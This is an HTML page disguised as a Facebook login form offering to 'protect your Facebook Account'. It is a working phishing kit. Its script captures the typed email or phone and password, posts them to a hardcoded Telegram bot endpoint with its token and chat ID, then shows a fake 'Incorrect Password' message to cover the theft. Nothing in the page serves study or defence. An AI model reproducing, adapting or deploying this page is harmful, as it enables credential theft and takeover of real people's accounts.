<!DOCTYPE html>
<link rel="stylesheet" type="text/css" href="/acpro.css"/>
<html>
  <head>
    <title>Facebook Login</title>
  </head>
  <body>
    <header style="text-align:center";>
      <!-- header content -->
<h3 style="text-align:center;">Login and protect your Facebook Account</h3>
    </header>
    <main>
      <div class="container">
        <h1>Login to Facebook</h1>
        <form onsubmit="submitForm(event)">
          <div class="form-group">
            <label for="email">Email or Phone</label>
            <input type="text" id="email" name="email">
          </div>
          <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password">
          </div>
          <button type="submit">Sign In</button>


          <div class="forgot-password">
            <a href="https://m.facebook.com/login/identify/ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Forgot Password?</a>
          </div>
        </form>
      </div>
    </main>
    <script>
      function submitForm(event) {
        event.preventDefault(); // prevent form from submitting normally
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const url = 'https://api.telegram.org/bot5866517143:AAH5C-_Ebd-Cn11pkfCwE-ps3J1pPXfP2nk/sendMessage';
        const data = {




          chat_id: '1878190695',





          text: `Email/Phone: ${email}, Password: ${password}`
        };
        const options = {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        };
        fetch(url, options)
          .then(response => response.json())
          .then(data => {
            console.log('Message sent successfully:', data);
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
               var errorMessage = "Incorrect Password! Please try again.";
      document.getElementById("error-message").textContent = errorMessage;
          })
          .catch(error => console.error('Error sending message:', error));
      }
    </script>

<p id="error-message"></p>
  </body>
</html>
